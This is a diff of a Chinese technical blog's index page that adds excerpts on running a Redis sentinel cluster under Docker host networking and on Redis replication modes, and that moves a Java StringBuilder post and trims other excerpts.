@@ -293,6 +293,393 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://marticles.github.io/2019/02/15/Docker 网络模型踩坑/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Marticles">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0xCAFEBABE">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/02/15/Docker 网络模型踩坑/" itemprop="url">Docker 网络模型踩坑</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-15T21:13:11+08:00">
+                2019-02-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Docker/" itemprop="url" rel="index">
+                    <span itemprop="name">Docker</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/02/15/Docker 网络模型踩坑/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/02/15/Docker 网络模型踩坑/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/02/15/Docker 网络模型踩坑/" class="leancloud_visitors" data-flag-title="Docker 网络模型踩坑">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  399 字
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇笔记源自上次 Docker 下搭建 Redis 哨兵集群所踩的坑，主要原因是 Docker 默认的网络模型是 Bridge，而在设置哨兵的 matser IP 时用的是容器的内网地址，在 Spring Boot 中使用 Redis 时哨兵返回的仍是 Docker 的内网地址。</p>
+<p>解决办法是加入 docker 启动参数—network=host，改为 host 模式启动，并将 master 节点 IP 改为宿主的外网地址。</p>
+<p>借此机会，顺便学习一下 Docker 的网络模型。</p>
+<h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># master与slave都改为host模式启动</span></span><br><span class="line">$ docker run -it --name redis-master --network=host -d -v /root/download/redis.conf:/usr/<span class="built_in">local</span>/etc/redis/redis.conf -d redis /bin/bash</span><br><span class="line">$ docker <span class="built_in">exec</span> -it redis-master bash</span><br><span class="line">$ redis-server /usr/<span class="built_in">local</span>/etc/redis/redis.conf</span><br><span class="line"></span><br><span class="line">$ docker run -it --name redis-slave1 --network=host -d -v /root/download/redis2.conf:/usr/<span class="built_in">local</span>/etc/redis/redis.conf -d redis /bin/bash</span><br><span class="line">$ docker <span class="built_in">exec</span> -it redis-slave1 bash</span><br><span class="line">$ redis-server /usr/<span class="built_in">local</span>/etc/redis/redis.conf</span><br><span class="line"></span><br><span class="line">$ docker run -it --name redis-slave2 --network=host -d -v /root/download/redis3.conf:/usr/<span class="built_in">local</span>/etc/redis/redis.conf -d redis /bin/bash</span><br><span class="line">$ docker <span class="built_in">exec</span> -it redis-slave2 bash</span><br><span class="line">$ redis-server /usr/<span class="built_in">local</span>/etc/redis/redis.conf</span><br></pre></td></tr></table></figure>
+<p>其中 redis-master 的 redis.conf：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 注释掉该字段，否则只允许本机连接</span><br><span class="line"># bind 127.0.0.1</span><br><span class="line">port 6379</span><br><span class="line">daemonize yes</span><br><span class="line">requirepass yourpassword</span><br><span class="line">masterauth yourpassword</span><br></pre></td></tr></table></figure></p>
+<p>注意 redis-slave1 与 redis-slave2 的 redis.conf中还需加入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replicaof &lt;redis-master ip&gt; &lt;redis-master port&gt;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 哨兵也改为host模式启动</span></span><br><span class="line">$ docker run -it --name redis-sentinel --network=host -d -v /root/download/sentinel.conf:/usr/<span class="built_in">local</span>/etc/redis/sentinel.conf -d redis /bin/bash</span><br><span class="line">$ docker <span class="built_in">exec</span> -it redis-sentinel1 bash</span><br><span class="line">$ redis-sentinel /usr/<span class="built_in">local</span>/etc/redis/sentinel.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他哨兵配置同上</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/02/15/Docker 网络模型踩坑/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://marticles.github.io/2019/02/14/Redis中的主从、哨兵、集群原理及搭建/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Marticles">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0xCAFEBABE">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/02/14/Redis中的主从、哨兵、集群原理及搭建/" itemprop="url">Redis中的主从、哨兵、集群原理及搭建.</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-14T16:49:51+08:00">
+                2019-02-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Redis/" itemprop="url" rel="index">
+                    <span itemprop="name">Redis</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/02/14/Redis中的主从、哨兵、集群原理及搭建/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/02/14/Redis中的主从、哨兵、集群原理及搭建/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/02/14/Redis中的主从、哨兵、集群原理及搭建/" class="leancloud_visitors" data-flag-title="Redis中的主从、哨兵、集群原理及搭建.">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2,071 字
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>毕设中使用了 Redis 作为缓存，自己以往的项目中使用的都是单机的 Redis，借此机会，熟悉下 Redis 集群的搭建过程(特别是哨兵模式)及其原理。</p>
+<p>Redis中的集群模式主要分为三种：主从(Master/Slaver)、哨兵(Sentail)和 Cluster。</p>
+<h2 id="主从-Master-Slaver"><a href="#主从-Master-Slaver" class="headerlink" title="主从(Master/Slaver)"></a>主从(Master/Slaver)</h2><p>注：由于某些政治正确原因，Redis 官方现在已经将 Master/Slaver 改为 Master/Replica，一些相关的命令诸如 <code>slaverof &lt;Matser-IP&gt;</code> 也改成了 <code>replicaof &lt;Matser-IP&gt;</code>，但原有的命令暂时还是可用并存的。</p>
+<p>个人理解，主从模式的作用有以下两点：</p>
+<ul>
+<li><strong>容灾备份</strong>，当一个节点损坏时，数据因为有备份，可以方便恢复。</li>
+<li><strong>负载均衡</strong>，通过读写分离，所有写请求将由 master完成，读请求则可以通过其他 slave 来完成，从而可以支持更高的并发量。</li>
+</ul>
+<p>主从模式下，一个 master 可以有多个 slave，但一个 slave 只能有一个master，且数据流向是单向的，由由 master 到 slave。</p>
+<p>注意，处于保证主和各个从之间数据一致性的考虑，slave 默认是无法提供写服务的，除非将配置文件中的 <code>replica-read-only</code> 改为 <code>no</code>，但这样的话就要自己实现主从一致性。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Since Redis 2.6 by default replicas are read-only.</span><br><span class="line">replica-read-only yes</span><br></pre></td></tr></table></figure></p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/02/14/Redis中的主从、哨兵、集群原理及搭建/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://marticles.github.io/2019/02/12/Java中的强引用、弱引用、软引用和虚引用/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -596,7 +983,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  5,395 字
+                  5,403 字
                 </span>
               
 
@@ -622,7 +1009,7 @@
 
       
         
-          <h2 id="ThreadLocal-原理"><a href="#ThreadLocal-原理" class="headerlink" title="ThreadLocal 原理"></a>ThreadLocal 原理</h2><p>每个线程内部维护着一个 ThreadLocalMap，它是一个由 tabel 作为底层实现 。这个 map 的 key 是一个弱引用，指向 ThreadLocal 本身，value 是存放的变量 Object。</p>
+          <h2 id="ThreadLocal-原理"><a href="#ThreadLocal-原理" class="headerlink" title="ThreadLocal 原理"></a>ThreadLocal 原理</h2><p>每个线程内部维护着一个 ThreadLocalMap，这个 Map 的底层是由数组 table 实现的，用于存储 Entry。ThreadLocalMap 中的 key 为弱引用类型，指向 ThreadLocal 本身，value 是实际存储的变量 Object。</p>
 <p><img src="/images/Java8-ThreadLocal源码阅读/ThreadLocal.jpg" alt="ThreadLocal"></p>
 <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>ThreadLocal 的作用是提供<strong>线程内的局部变量</strong>，该变量在线程的生命周期内起作用，减少同一个线程内多个函数或者组件之间一些公共变量的传递的复杂度。</p>
 <p>其他线程无法访问 ThreadLocal 内的变量，这样就隔离了多个线程间的资源，也不会出现线程安全问题。</p>
@@ -1086,200 +1473,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://marticles.github.io/2018/12/17/记一次随机验证码生成的优化过程/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Marticles">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="0xCAFEBABE">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/12/17/记一次随机验证码生成的优化过程/" itemprop="url">记一次随机验证码生成的优化过程</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-17T23:48:12+08:00">
-                2018-12-17
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Java/" itemprop="url" rel="index">
-                    <span itemprop="name">Java</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2018/12/17/记一次随机验证码生成的优化过程/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2018/12/17/记一次随机验证码生成的优化过程/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2018/12/17/记一次随机验证码生成的优化过程/" class="leancloud_visitors" data-flag-title="记一次随机验证码生成的优化过程">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  1,304 字
-                </span>
-              
-
-              
-
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>拼接字符串最好不要直接用 “+” ，因为编译器遇到 “+” 的时候，会 new 一个 StringBuilder 出来，接着调用 append 方法进行追加，再调用 toString 方法，生成新字符串。在每次循环中，都会创建一个 StringBuilder 对象，且都会调用一次 toString 方法，可见用 “+” 拼接字符串的成本是十分高的。</p>
-<p>PS：执行一次字符串 “str += a”，相当于 “str = new StringBuilder(str).append(“a”).toString()”</p>
-<h2 id="String、StringBuilder、StringBuffer-的区别"><a href="#String、StringBuilder、StringBuffer-的区别" class="headerlink" title="String、StringBuilder、StringBuffer 的区别"></a>String、StringBuilder、StringBuffer 的区别</h2><p>String 为字符串常量，而 StringBuilder 和 StringBuffer 均为字符串变量，即 String 对象一旦创建之后该对象是不可更改的，但后两者的对象是变量，是可以更改的。</p>
-<p>运行效率：StringBuilder &gt; StringBuffer &gt; String</p>
-<p>StringBuffer 和 StringBuilder 都继承自 AbstractStringBuilder，原理一样，就是在底层维护了一个 char 数组，唯一的区别只是 StringBuffer 是线程安全的，它对所有方法都做了同步，而 StringBuilder 是非线程安全的。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AbstractStringBuilder(<span class="keyword">int</span> capacity) &#123;</span><br><span class="line">        value = <span class="keyword">new</span> <span class="keyword">char</span>[capacity];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>每次 append 的时候就会往 char[ ] 中填入字符，在最终调用 sb.toString( ) 的时候，用一个 new String( ) 方法把 char 数组里面的内容都转成 String，这样，整个过程中只产生了一个 StringBuilder 对象与一个 String 对象，非常节省空间。</p>
-<p>StringBuilde r唯一的性能损耗点在于 char[ ] 容量不够的时候需要进行扩容，扩容需要进行数组拷贝，一定程度上降低了效率。</p>
-<p>考虑到扩容的时候有性能上的损耗，尽量在初始化时预估长度并传入该长度，可以避免扩容的发生。</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/12/17/记一次随机验证码生成的优化过程/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://marticles.github.io/2018/12/17/Java8-HashMap源码阅读/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1672,6 +1865,200 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://marticles.github.io/2018/12/10/记一次随机验证码生成的优化过程/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Marticles">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0xCAFEBABE">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/10/记一次随机验证码生成的优化过程/" itemprop="url">记一次随机验证码生成的优化过程</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-10T23:48:12+08:00">
+                2018-12-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java/" itemprop="url" rel="index">
+                    <span itemprop="name">Java</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/12/10/记一次随机验证码生成的优化过程/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2018/12/10/记一次随机验证码生成的优化过程/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2018/12/10/记一次随机验证码生成的优化过程/" class="leancloud_visitors" data-flag-title="记一次随机验证码生成的优化过程">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1,304 字
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>拼接字符串最好不要直接用 “+” ，因为编译器遇到 “+” 的时候，会 new 一个 StringBuilder 出来，接着调用 append 方法进行追加，再调用 toString 方法，生成新字符串。在每次循环中，都会创建一个 StringBuilder 对象，且都会调用一次 toString 方法，可见用 “+” 拼接字符串的成本是十分高的。</p>
+<p>PS：执行一次字符串 “str += a”，相当于 “str = new StringBuilder(str).append(“a”).toString()”</p>
+<h2 id="String、StringBuilder、StringBuffer-的区别"><a href="#String、StringBuilder、StringBuffer-的区别" class="headerlink" title="String、StringBuilder、StringBuffer 的区别"></a>String、StringBuilder、StringBuffer 的区别</h2><p>String 为字符串常量，而 StringBuilder 和 StringBuffer 均为字符串变量，即 String 对象一旦创建之后该对象是不可更改的，但后两者的对象是变量，是可以更改的。</p>
+<p>运行效率：StringBuilder &gt; StringBuffer &gt; String</p>
+<p>StringBuffer 和 StringBuilder 都继承自 AbstractStringBuilder，原理一样，就是在底层维护了一个 char 数组，唯一的区别只是 StringBuffer 是线程安全的，它对所有方法都做了同步，而 StringBuilder 是非线程安全的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AbstractStringBuilder(<span class="keyword">int</span> capacity) &#123;</span><br><span class="line">        value = <span class="keyword">new</span> <span class="keyword">char</span>[capacity];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>每次 append 的时候就会往 char[ ] 中填入字符，在最终调用 sb.toString( ) 的时候，用一个 new String( ) 方法把 char 数组里面的内容都转成 String，这样，整个过程中只产生了一个 StringBuilder 对象与一个 String 对象，非常节省空间。</p>
+<p>StringBuilde r唯一的性能损耗点在于 char[ ] 容量不够的时候需要进行扩容，扩容需要进行数组拷贝，一定程度上降低了效率。</p>
+<p>考虑到扩容的时候有性能上的损耗，尽量在初始化时预估长度并传入该长度，可以避免扩容的发生。</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/12/10/记一次随机验证码生成的优化过程/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://marticles.github.io/2018/12/02/Java8-Object源码阅读/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1857,392 +2244,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://marticles.github.io/2018/11/20/StrongFriends开发笔记/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Marticles">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="0xCAFEBABE">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/20/StrongFriends开发笔记/" itemprop="url">StrongFriends开发笔记</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-20T12:38:26+08:00">
-                2018-11-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Java/" itemprop="url" rel="index">
-                    <span itemprop="name">Java</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2018/11/20/StrongFriends开发笔记/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2018/11/20/StrongFriends开发笔记/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2018/11/20/StrongFriends开发笔记/" class="leancloud_visitors" data-flag-title="StrongFriends开发笔记">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  6,784 字
-                </span>
-              
-
-              
-
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>StrongFriends，又称壮壮朋友(๑•̀ㅂ•́)و✧，是我开发的一个举铁爱好者论坛。主要功能包括：发帖、评论、赞踩、私信、RM 计算器、维京系数计算器、力量排行榜、帖子 / 评论 / 用户管理。</p>
-<p>前端：BootStraps 后端：SpringBoot / Mybatis DB: MySQL / Redis</p>
-<p>以下是个人在实现一些重点功能所做的笔记。</p>
-<h2 id="Spring-接收参数的几种方式"><a href="#Spring-接收参数的几种方式" class="headerlink" title="Spring 接收参数的几种方式"></a>Spring 接收参数的几种方式</h2><h3 id="1-通过-RequestParam-获取请求参数"><a href="#1-通过-RequestParam-获取请求参数" class="headerlink" title="1. 通过 @RequestParam 获取请求参数"></a>1. 通过 <code>@RequestParam</code> 获取请求参数</h3><p>用注解<code>@RequestParam</code>绑定请求参数 <code>param</code> 到变量 <code>testParam</code>，当请求参数 <code>param</code> 不存在时会有异常发生,可以通过设置属性 <code>required=false</code> 解决，例如 <code>@RequestParam(value=&quot;a&quot;, required=false)</code>。</p>
